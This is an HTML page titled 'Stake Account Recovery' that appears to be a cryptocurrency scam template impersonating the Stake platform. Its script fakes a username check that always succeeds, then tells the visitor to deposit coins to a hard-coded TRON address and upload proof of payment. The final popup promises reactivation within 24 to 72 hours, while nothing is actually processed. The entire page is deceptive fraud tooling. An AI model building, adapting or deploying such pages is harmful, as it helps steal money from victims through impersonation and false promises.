<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Stake Account Recovery</title>
  <style>
    body {
      background-color: #1c1c1c;
      color: white;
      font-family: Arial, sans-serif;
      padding: 20px;
    }

    h1, p {
      text-align: center;
    }

    .container {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      max-width: 600px;
      margin: 0 auto;
    }

    .input-box {
      margin: 10px 0;
      padding: 10px;
      width: 100%;
      background-color: #2a2a2a;
      border: 1px solid #444;
      border-radius: 5px;
      color: white;
    }

    .button {
      background-color: #4CAF50;
      color: white;
      border: none;
      padding: 10px 20px;
      border-radius: 5px;
      cursor: pointer;
      margin: 10px 0;
    }

    .button:disabled {
      background-color: #888;
      cursor: not-allowed;
    }

    .dropdown {
      width: 100%;
      padding: 10px;
      background-color: #2a2a2a;
      border: 1px solid #444;
      border-radius: 5px;
      color: white;
    }

    .copy-button {
      margin-top: 5px;
      padding: 5px;
      background-color: #4CAF50;
      color: white;
      border: none;
      border-radius: 3px;
      cursor: pointer;
    }

    .copy-button:hover {
      background-color: #45a049;
    }

    .popup {
      display: none;
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      background-color: rgba(0, 0, 0, 0.8);
      padding: 20px;
      border-radius: 10px;
      color: white;
      text-align: center;
      width: 300px;
    }

    .popup .ok-button {
      background-color: #4CAF50;
      color: white;
      border: none;
      padding: 10px;
      border-radius: 5px;
      cursor: pointer;
      margin-top: 10px;
    }

    .popup .ok-button:hover {
      background-color: #45a049;
    }

    .loading {
      display: none;
    }

  </style>
</head>
<body>

  <h1>Stake Account Recovery</h1>
  <p>Please follow the steps below to recover your Stake account.</p>

  <div class="container">
    <div>
      <label for="username">Enter Username:</label>
      <input type="text" id="username" class="input-box" placeholder="Enter your username" required>
      <button class="button" id="verify-button">Verify</button>
      <div id="loading" class="loading">Verifying...</div>
      <div id="verification-message"></div>
    </div>

    <div>
      <label for="crypto">Select Coin:</label>
      <select id="crypto" class="dropdown">
        <option value="usdt">USDT</option>
        <option value="btc">BTC</option>
        <option value="trx">TRX</option>
        <option value="eth">Ethereum</option>
      </select>
    </div>

    <div>
      <label for="network">Select Network:</label>
      <select id="network" class="dropdown">
        <option value="bsc">BSC</option>
        <option value="trc20">TRC20</option>
      </select>
    </div>

    <div>
      <label for="address">Address:</label>
      <input type="text" id="address" class="input-box" disabled value="TDSyNXKqoanp6aZ14tg4D3ff48vuVjM6qA" />
      <button class="copy-button" onclick="copyAddress()">Copy</button>
    </div>

    <div>
      <label for="amount">Amount to Deposit ($):</label>
      <input type="number" id="amount" class="input-box" placeholder="Enter amount" required>
    </div>

    <div>
      <label for="screenshot">Upload Transaction Screenshot:</label>
      <input type="file" id="screenshot" class="input-box" required>
    </div>

    <button class="button" id="submit-button" disabled>Submit</button>
  </div>

  <div id="popup" class="popup">
    <p>Your account recovery request has been received by Stake Pass. Your Stake account will be fully active within 24 - 72 hours.</p>
    <button class="ok-button" onclick="refreshPage()">OK</button>
  </div>

  <script>
    const usernameInput = document.getElementById('username');
    const verifyButton = document.getElementById('verify-button');
    const loading = document.getElementById('loading');
    const verificationMessage = document.getElementById('verification-message');
    const submitButton = document.getElementById('submit-button');

    const cryptoSelect = document.getElementById('crypto');
    const networkSelect = document.getElementById('network');
    const addressInput = document.getElementById('address');
    const amountInput = document.getElementById('amount');
    const screenshotInput = document.getElementById('screenshot');

    // Username verification logic
    verifyButton.addEventListener('click', function() {
      const username = usernameInput.value;

      if (username) {
        loading.style.display = 'block';
        setTimeout(function() {
          loading.style.display = 'none';
          verificationMessage.textContent = 'Username Verified!';
          enableSubmitButton();
        }, 2000);  // Simulate a loading time of 2 seconds
      }
    });

    // Enable submit button if all fields are filled
    function enableSubmitButton() {
      if (usernameInput.value && amountInput.value && screenshotInput.files.length > 0) {
        submitButton.disabled = false;
      }
    }

    // Copy address to clipboard
    function copyAddress() {
      addressInput.select();
      document.execCommand("copy");
    }

    // Submit form and show popup
    submitButton.addEventListener('click', function() {
      if (submitButton.disabled) return;

      // Show confirmation popup
      const popup = document.getElementById('popup');
      popup.style.display = 'block';
    });

    // Refresh the page when clicking "OK" in the popup
    function refreshPage() {
      location.reload();
    }

    // Listen for changes to enable/disable submit button
    usernameInput.addEventListener('input', enableSubmitButton);
    amountInput.addEventListener('input', enableSubmitButton);
    screenshotInput.addEventListener('change', enableSubmitButton);
  </script>

</body>
</html>
